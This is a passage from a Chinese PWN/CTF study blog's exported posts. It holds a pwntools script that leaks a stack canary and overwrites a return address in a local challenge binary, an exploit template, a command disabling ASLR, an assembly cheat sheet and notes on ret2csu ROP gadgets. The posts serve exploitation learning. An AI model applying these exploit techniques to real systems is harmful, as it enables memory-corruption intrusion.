alt="Pasted image 20250217212740"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212923.png" alt="Pasted image 20250217212923"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#  context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;deepin-terminal&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./babypie&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  gdb.attach(io)</span></span><br><span class="line">        io.sendafter(<span class="string">b&quot;:\n&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        canary = <span class="string">b&#x27;\0&#x27;</span> + io.recvn(<span class="number">7</span>)</span><br><span class="line">        success(canary.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  gdb.attach(io)</span></span><br><span class="line">        io.sendafter(<span class="string">b&quot;:\n&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span>) + canary + <span class="string">b&#x27;bbbbbbbb&#x27;</span> + <span class="string">b&#x27;\x3E\x0A&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="built_in">print</span> （e）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> PWN技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一般流程与exp板子</title>
      <link href="/2025/02/25/%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E4%B8%8Eexp%E6%9D%BF%E5%AD%90/"/>
      <url>/2025/02/25/%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E4%B8%8Eexp%E6%9D%BF%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<h2 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h2><p>chmod u+x<br>checksec<br><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br><code>sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other</code></p><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit">Chromium OS Docs - Linux System Call Table</a></p><p>泄露libc<br><a href="https://libc.blukat.me/">libc database search</a></p><p>系统调用<br><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit">Chromium OS Docs - Linux System Call Table</a><br>速查源码<br><a href="https://elixir.bootlin.com/glibc/glibc-2.41.9000/source">Glibc source code (glibc-2.41.9000) - Bootlin Elixir Cross Referencer</a></p><h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./&#x27;</span>) </span><br><span class="line">p=remote(<span class="string">&#x27;ip&#x27;</span>,port)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">s = <span class="keyword">lambda</span> s : p.send(s) </span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s) </span><br><span class="line">sa = <span class="keyword">lambda</span> n,s : p.sendafter(n,s) </span><br><span class="line">sla = <span class="keyword">lambda</span> n,s : p.sendlineafter(n,s) </span><br><span class="line">r = <span class="keyword">lambda</span> n : p.recv(n) </span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline() </span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s) </span><br><span class="line">ra = <span class="keyword">lambda</span> : p.recvall() </span><br><span class="line">ia = <span class="keyword">lambda</span> : p.interactive() </span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) </span></span><br><span class="line"><span class="comment"># u32(p.recvuntil(b&#x27;\\xf7&#x27;)) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(): </span><br><span class="line">    gdb.attach(p) </span><br><span class="line">    pause() </span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础-汇编（字节序寄存器-传参-指令速查）</title>
      <link href="/2025/02/23/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/"/>
      <url>/2025/02/23/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>又称 <strong>端序</strong> 或 <strong>尾序</strong>（英语中用单词：<strong>Endianness</strong> 表示）。在计算机领域中，指电脑内存中 <strong>占用多个字节的数据的字节</strong> 在 <strong>内存中的排列顺序</strong>。</p><ul><li>大端序（Big-Endian）将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址。这种排列方式与数据用字节表示时的书写顺序一致，符合人类的阅读习惯。</li><li>小端序（Little-Endian），将一个多位数的低位放在较小的地址处，高位放在较大的地址处，则称小端序。小端序与人类的阅读习惯相反，但更符合计算机读取内存的方式，因为CPU读取内存中的数据时，是从低地址向高地址方向进行读取的。</li></ul><p><img src="/2025/02/23/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/image-20250327202035913.png" alt="image-20250327202035913"></p><ul><li>为什么会有字节序，统一用大端序不行吗？答案是，计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，<strong>计算机的内部处理都是小端字节序。在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序</strong>。内存中的多字节数据相对于内存地址有大端和小端之分 ， 磁盘文件中的多字节数据相对于文件中的偏移地址也有大端小端之分 。 网络数据流同样有大端小端之分 ， 也就是说,当接收端收到第一个字节的时候，它将这个字节作为高位字节还是低位字节处理</li></ul><blockquote><p><strong>对于一串数据，解析有两种方法：缓冲区，或者流。</strong></p><ul><li>网络数据流的地址应这样规定：先发出的数据是低地址 ， 后发出的数据是高地址。</li><li>TCP/IP协议规定：把接收到的第一个字节当作高位字节看待 ， 因此网络数据流应采用大端字节序 ， 即低地址高字节。<br>为什么这样定，初始定义者的选择而已。定下来便成为铁律。<br>网络字节序为什么使用大端字节序：<a href="https://www.zhihu.com/question/458844566" title="https://www.zhihu.com/question/458844566">https://www.zhihu.com/question/458844566</a></li></ul></blockquote><h2 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h2><h3 id="64位文件的传参方式"><a href="#64位文件的传参方式" class="headerlink" title="64位文件的传参方式"></a>64位文件的传参方式</h3><p>在64位系统中，在调用函数时，其前六个参数是在rdi,rsi,rdx,rcx,r8,r9中取<br>当参数少于7个时， 参数从左到右放入寄存器: <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code>。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">参数个数大于 <span class="number">7</span> 个的时候  </span><br><span class="line">H(a, b, c, d, e, f, g, h);  </span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9  </span><br><span class="line">h-&gt;<span class="number">8</span>(%esp)  </span><br><span class="line">g-&gt;(%esp)  </span><br><span class="line">call H</span><br></pre></td></tr></table></figure></p><h2 id="8088-汇编速查手册"><a href="#8088-汇编速查手册" class="headerlink" title="8088 汇编速查手册"></a>8088 汇编速查手册</h2><h3 id="一、数据传输指令"><a href="#一、数据传输指令" class="headerlink" title="一、数据传输指令"></a>一、数据传输指令</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据.  </span><br><span class="line"><span class="number">1.</span> 通用数据传送指令.  </span><br><span class="line">    MOV    传送字或字节.  </span><br><span class="line">    MOVSX  先符号扩展,再传送.  </span><br><span class="line">    MOVZX  先零扩展,再传送.  </span><br><span class="line">    PUSH    把字压入堆栈.  </span><br><span class="line">    POP    把字弹出堆栈.  </span><br><span class="line">    PUSHA  把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈.  </span><br><span class="line">    POPA    把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈.  </span><br><span class="line">    PUSHAD  把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈.  </span><br><span class="line">    POPAD  把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈.  </span><br><span class="line">    BSWAP  交换<span class="number">32</span>位寄存器里字节的顺序  </span><br><span class="line">    XCHG    交换字或字节.( 至少有一个操作数为寄存器,段寄存器不可作为操作数)  </span><br><span class="line">    CMPXCHG 比较并交换操作数.( 第二个操作数必须为累加器AL/AX/EAX )  </span><br><span class="line">    XADD    先交换再累加.( 结果在第一个操作数里 )  </span><br><span class="line">    XLAT    字节查表转换.  </span><br><span class="line">            ── BX 指向一张 <span class="number">256</span> 字节的表的起点, AL 为表的索引值 (<span class="number">0</span><span class="number">-255</span>,即  </span><br><span class="line">            <span class="number">0</span>-FFH); 返回 AL 为查表结果. ( [BX+AL]-&gt;AL )  </span><br><span class="line"><span class="number">2.</span> 输入输出端口传送指令.  </span><br><span class="line">    IN      I/O端口输入. ( 语法: IN 累加器, &#123;端口号│DX&#125; )  </span><br><span class="line">    OUT    I/O端口输出. ( 语法: OUT &#123;端口号│DX&#125;,累加器 )  </span><br><span class="line">      输入输出端口由立即方式指定时, 其范围是 <span class="number">0</span><span class="number">-255</span>; 由寄存器 DX 指定时,  </span><br><span class="line">      其范围是 <span class="number">0</span><span class="number">-65535.</span>  </span><br><span class="line"><span class="number">3.</span> 目的地址传送指令.  </span><br><span class="line">    LEA    装入有效地址.  </span><br><span class="line">      例: LEA DX,<span class="built_in">string</span>  ;把偏移地址存到DX.  </span><br><span class="line">    LDS    传送目标指针,把指针内容装入DS.  </span><br><span class="line">      例: LDS SI,<span class="built_in">string</span>  ;把段地址:偏移地址存到DS:SI.  </span><br><span class="line">    LES    传送目标指针,把指针内容装入ES.  </span><br><span class="line">      例: LES DI,<span class="built_in">string</span>  ;把段地址:偏移地址存到ES:DI.  </span><br><span class="line">    LFS    传送目标指针,把指针内容装入FS.  </span><br><span class="line">      例: LFS DI,<span class="built_in">string</span>  ;把段地址:偏移地址存到FS:DI.  </span><br><span class="line">    LGS    传送目标指针,把指针内容装入GS.  </span><br><span class="line">      例: LGS DI,<span class="built_in">string</span>  ;把段地址:偏移地址存到GS:DI.  </span><br><span class="line">    LSS    传送目标指针,把指针内容装入SS.  </span><br><span class="line">      例: LSS DI,<span class="built_in">string</span>  ;把段地址:偏移地址存到SS:DI.  </span><br><span class="line"><span class="number">4.</span> 标志传送指令.  </span><br><span class="line">    LAHF    标志寄存器传送,把标志装入AH.  </span><br><span class="line">    SAHF    标志寄存器传送,把AH内容装入标志寄存器.  </span><br><span class="line">    PUSHF  标志入栈.  </span><br><span class="line">    POPF    标志出栈.  </span><br><span class="line">    PUSHD  <span class="number">32</span>位标志入栈.  </span><br><span class="line">    POPD    <span class="number">32</span>位标志出栈.  </span><br></pre></td></tr></table></figure><h3 id="二、算术运算指令"><a href="#二、算术运算指令" class="headerlink" title="二、算术运算指令"></a>二、算术运算指令</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ADD    加法.  </span><br><span class="line">ADC    带进位加法.  </span><br><span class="line">INC    加 <span class="number">1.</span>  </span><br><span class="line">AAA    加法的ASCII码调整.  </span><br><span class="line">DAA    加法的十进制调整.  </span><br><span class="line">SUB    减法.  </span><br><span class="line">SBB    带借位减法.  </span><br><span class="line">DEC    减 <span class="number">1.</span>  </span><br><span class="line">NEC    求反(以 <span class="number">0</span> 减之).  </span><br><span class="line">CMP    比较.(两操作数作减法,仅修改标志位,不回送结果).  </span><br><span class="line">AAS    减法的ASCII码调整.  </span><br><span class="line">DAS    减法的十进制调整.  </span><br><span class="line">MUL    无符号乘法.  </span><br><span class="line">IMUL    整数乘法.  </span><br><span class="line">  以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算),  </span><br><span class="line">AAM    乘法的ASCII码调整.  </span><br><span class="line">DIV    无符号除法.  </span><br><span class="line">IDIV    整数除法.  </span><br><span class="line">  以上两条,结果回送:  </span><br><span class="line">      商回送AL,余数回送AH, (字节运算);  </span><br><span class="line">  或  商回送AX,余数回送DX, (字运算).  </span><br><span class="line">AAD    除法的ASCII码调整.  </span><br><span class="line">CBW    字节转换为字. (把AL中字节的符号扩展到AH中去)  </span><br><span class="line">CWD    字转换为双字. (把AX中的字的符号扩展到DX中去)  </span><br><span class="line">CWDE    字转换为双字. (把AX中的字符号扩展到EAX中去)  </span><br><span class="line">CDQ    双字扩展.    (把EAX中的字的符号扩展到EDX中去)  </span><br></pre></td></tr></table></figure><h3 id="三、逻辑运算指令"><a href="#三、逻辑运算指令" class="headerlink" title="三、逻辑运算指令"></a>三、逻辑运算指令</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AND    与运算.  </span><br><span class="line">OR      或运算.  </span><br><span class="line">XOR    异或运算.  </span><br><span class="line">NOT    取反.  </span><br><span class="line">TEST    测试.(两操作数作与运算,仅修改标志位,不回送结果).  </span><br><span class="line">SHL    逻辑左移.  </span><br><span class="line">SAL    算术左移.(=SHL)  </span><br><span class="line">SHR    逻辑右移.  </span><br><span class="line">SAR    算术右移.(=SHR)  </span><br><span class="line">ROL    循环左移.  </span><br><span class="line">ROR    循环右移.  </span><br><span class="line">RCL    通过进位的循环左移.  </span><br><span class="line">RCR    通过进位的循环右移.  </span><br><span class="line">  以上八种移位指令,其移位次数可达<span class="number">255</span>次.  </span><br><span class="line">      移位一次时, 可直接用操作码.  如 SHL AX,<span class="number">1.</span>  </span><br><span class="line">      移位&gt;<span class="number">1</span>次时, 则由寄存器CL给出移位次数.  </span><br><span class="line">        如  MOV CL,<span class="number">04</span>  </span><br><span class="line">            SHL AX,CL  </span><br></pre></td></tr></table></figure><h3 id="四、串指令"><a href="#四、串指令" class="headerlink" title="四、串指令"></a>四、串指令</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    DS:SI  源串段寄存器  :源串变址.  </span><br><span class="line">    ES:DI  目标串段寄存器:目标串变址.  </span><br><span class="line">    CX      重复次数计数器.  </span><br><span class="line">    AL/AX  扫描值.  </span><br><span class="line">    D标志  <span class="number">0</span>表示重复操作中SI和DI应自动增量; <span class="number">1</span>表示应自动减量.  </span><br><span class="line">    Z标志  用来控制扫描或比较操作的结束.  </span><br><span class="line">MOVS    串传送.  </span><br><span class="line">    ( MOVSB  传送字符.    MOVSW  传送字.    MOVSD  传送双字. )  </span><br><span class="line">CMPS    串比较.  </span><br><span class="line">    ( CMPSB  比较字符.    CMPSW  比较字. )  </span><br><span class="line">SCAS    串扫描.  </span><br><span class="line">    把AL或AX的内容与目标串作比较,比较结果反映在标志位.  </span><br><span class="line">LODS    装入串.  </span><br><span class="line">    把源串中的元素(字或字节)逐一装入AL或AX中.  </span><br><span class="line">    ( LODSB  传送字符.    LODSW  传送字.    LODSD  传送双字. )  </span><br><span class="line">STOS    保存串.  </span><br><span class="line">    是LODS的逆过程.  </span><br><span class="line">REP            当CX/ECX&lt;&gt;<span class="number">0</span>时重复.  </span><br><span class="line">REPE/REPZ      当ZF=<span class="number">1</span>或比较结果相等,且CX/ECX&lt;&gt;<span class="number">0</span>时重复.  </span><br><span class="line">REPNE/REPNZ    当ZF=<span class="number">0</span>或比较结果不相等,且CX/ECX&lt;&gt;<span class="number">0</span>时重复.  </span><br><span class="line">REPC          当CF=<span class="number">1</span>且CX/ECX&lt;&gt;<span class="number">0</span>时重复.  </span><br><span class="line">REPNC          当CF=<span class="number">0</span>且CX/ECX&lt;&gt;<span class="number">0</span>时重复.  </span><br></pre></td></tr></table></figure><h3 id="五、程序转移指令"><a href="#五、程序转移指令" class="headerlink" title="五、程序转移指令"></a>五、程序转移指令</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">　<span class="number">1</span>&gt;无条件转移指令 (长转移)  </span><br><span class="line">    JMP    无条件转移指令  </span><br><span class="line">    CALL    过程调用  </span><br><span class="line">    RET/RETF过程返回.  </span><br><span class="line"><span class="number">2</span>&gt;条件转移指令 (短转移,<span class="number">-128</span>到+<span class="number">127</span>的距离内)  </span><br><span class="line">    ( 当且仅当(SF XOR OF)=<span class="number">1</span>时,OP1&lt;OP2 )  </span><br><span class="line">    JA/JNBE 不小于或不等于时转移.  </span><br><span class="line">    JAE/JNB 大于或等于转移.  </span><br><span class="line">    JB/JNAE 小于转移.  </span><br><span class="line">    JBE/JNA 小于或等于转移.  </span><br><span class="line">      以上四条,测试无符号整数运算的结果(标志C和Z).  </span><br><span class="line">    JG/JNLE 大于转移.  </span><br><span class="line">    JGE/JNL 大于或等于转移.  </span><br><span class="line">    JL/JNGE 小于转移.  </span><br><span class="line">    JLE/JNG 小于或等于转移.  </span><br><span class="line">      以上四条,测试带符号整数运算的结果(标志S,O和Z).  </span><br><span class="line">    JE/JZ  等于转移.  </span><br><span class="line">    JNE/JNZ 不等于时转移.  </span><br><span class="line">    JC      有进位时转移.  </span><br><span class="line">    JNC    无进位时转移.  </span><br><span class="line">    JNO    不溢出时转移.  </span><br><span class="line">    JNP/JPO 奇偶性为奇数时转移.  </span><br><span class="line">    JNS    符号位为 <span class="string">&quot;0&quot;</span> 时转移.  </span><br><span class="line">    JO      溢出转移.  </span><br><span class="line">    JP/JPE  奇偶性为偶数时转移.  </span><br><span class="line">    JS      符号位为 <span class="string">&quot;1&quot;</span> 时转移.  </span><br><span class="line"><span class="number">3</span>&gt;循环控制指令(短转移)  </span><br><span class="line">    LOOP            CX不为零时循环.  </span><br><span class="line">    LOOPE/LOOPZ    CX不为零且标志Z=<span class="number">1</span>时循环.  </span><br><span class="line">    LOOPNE/LOOPNZ  CX不为零且标志Z=<span class="number">0</span>时循环.  </span><br><span class="line">    JCXZ            CX为零时转移.  </span><br><span class="line">    JECXZ          ECX为零时转移.  </span><br><span class="line"><span class="number">4</span>&gt;中断指令  </span><br><span class="line">    INT    中断指令  </span><br><span class="line">    INTO    溢出中断  </span><br><span class="line">    IRET    中断返回  </span><br><span class="line"><span class="number">5</span>&gt;处理器控制指令  </span><br><span class="line">    HLT    处理器暂停, 直到出现中断或复位信号才继续.  </span><br><span class="line">    WAIT    当芯片引线TEST为高电平时使CPU进入等待状态.  </span><br><span class="line">    ESC    转换到外处理器.  </span><br><span class="line">    LOCK    封锁总线.  </span><br><span class="line">    NOP    空操作.  </span><br><span class="line">    STC    置进位标志位.  </span><br><span class="line">    CLC    清进位标志位.  </span><br><span class="line">    CMC    进位标志取反.  </span><br><span class="line">    STD    置方向标志位.  </span><br><span class="line">    CLD    清方向标志位.  </span><br><span class="line">    STI    置中断允许位.  </span><br><span class="line">    CLI    清中断允许位.  </span><br></pre></td></tr></table></figure><h3 id="六、伪指令"><a href="#六、伪指令" class="headerlink" title="六、伪指令"></a>六、伪指令</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DW      定义字(<span class="number">2</span>字节).  </span><br><span class="line">PROC    定义过程.  </span><br><span class="line">ENDP    过程结束.  </span><br><span class="line">SEGMENT 定义段.  </span><br><span class="line">ASSUME  建立段寄存器寻址.  </span><br><span class="line">ENDS    段结束.  </span><br><span class="line">END    程序结束.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Art_of_shellcode</title>
      <link href="/2025/02/22/Art-of-shellcode/"/>
      <url>/2025/02/22/Art-of-shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="很有用的网址"><a href="#很有用的网址" class="headerlink" title="很有用的网址"></a>很有用的网址</h2><p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a></p><p><a href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/">https://v3rdant.cn/Pwn.The-Art-of-Shellcode/</a></p><p><a href="https://blog.csdn.net/weixin_59166557/article/details/143896997">PWN:手动编写 x64 基于syscall 的 shell code(TODO)_x64 syscall pwn-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进阶ROP</title>
      <link href="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/"/>
      <url>/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="进阶ROP"><a href="#进阶ROP" class="headerlink" title="进阶ROP"></a><strong>进阶ROP</strong></h1><h2 id="ret2-libc-csu-init-64位ELF"><a href="#ret2-libc-csu-init-64位ELF" class="headerlink" title="ret2__libc_csu_init(64位ELF)"></a><strong>ret2__libc_csu_init(64位ELF)</strong></h2><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>在64位程序中，<strong>函数的前6个参数是通过寄存器传递的</strong>，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数：</p><p><code>libc_csu_init</code>利用方法：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000004005</span>C0 ; <span class="type">void</span> _libc_csu_init(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000000004005</span>C0                 public __libc_csu_init</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="number">16</span>↑o</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004005</span>C0                 push    r15</span><br><span class="line">.text:<span class="number">00000000004005</span>C2                 push    r14</span><br><span class="line">.text:<span class="number">00000000004005</span>C4                 mov     r15d, edi</span><br><span class="line">.text:<span class="number">00000000004005</span>C7                 push    r13</span><br><span class="line">.text:<span class="number">00000000004005</span>C9                 push    r12</span><br><span class="line">.text:<span class="number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:<span class="number">00000000004005</span>D2                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:<span class="number">00000000004005</span>DA                 push    rbx</span><br><span class="line">.text:<span class="number">00000000004005</span>DB                 mov     r14, rsi</span><br><span class="line">.text:<span class="number">00000000004005</span>DE                 mov     r13, rdx</span><br><span class="line">.text:<span class="number">00000000004005E1</span>                 sub     rbp, r12</span><br><span class="line">.text:<span class="number">00000000004005E4</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004005E8</span>                 sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">00000000004005</span>EC                 call    _init_proc</span><br><span class="line">.text:<span class="number">00000000004005F</span>1                 test    rbp, rbp</span><br><span class="line">.text:<span class="number">00000000004005F</span>4                 jz      <span class="type">short</span> loc_400616</span><br><span class="line">.text:<span class="number">00000000004005F</span>6                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">0000000000400600</span></span><br><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br><span class="line">.text:<span class="number">0000000000400616</span></span><br><span class="line">.text:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> ; &#125; <span class="comment">// starts at 4005C0</span></span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure></p><ol><li>从0x000000000040061A一直到结尾，我们可以<strong>利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据</strong>。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> ; &#125; <span class="comment">// starts at 4005C0</span></span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init 